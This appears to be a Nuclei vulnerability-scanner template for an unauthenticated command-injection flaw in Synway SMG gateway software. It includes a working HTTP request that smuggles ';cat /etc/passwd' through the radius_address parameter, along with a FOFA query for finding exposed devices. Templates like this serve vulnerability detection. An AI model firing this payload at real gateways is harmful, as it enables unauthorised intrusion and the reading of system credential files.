id: sanhuiSMG-9-2radius-rce

info:
  name: Synway SMG Gateway 9-2radius.php - Remote Command Execution
  author: Chenkh
  severity: critical
  description: |
    Synway SMG Gateway Management Software contains a remote command execution vulnerability in 9-2radius.php. The radius_address parameter is passed to a system() call without sanitization, allowing unauthenticated attackers to execute arbitrary commands on the server.
  reference:
    - https://mp.weixin.qq.com/s/PyepoFSuQ63E3RnpQa9nsA
  metadata:
    verified: true
    max-request: 1
    fofa-query: body="text ml10 mr20" && (title="网关管理软件" || title="Gateway Management")
  tags: rce,synway,gateway,unauth

http:
  - raw:
      - |
        POST /en/9-2radius.php?authority=6 HTTP/1.1
        Host: {{Hostname}}
        Accept-Encoding: gzip
        Content-Type: application/x-www-form-urlencoded

        save=1&enable_radius=1&radius_address=/';cat /etc/passwd;+#

    matchers:
      - type: regex
        name: linux
        part: body
        regex:
          - 'root:[^:]*:0:0:'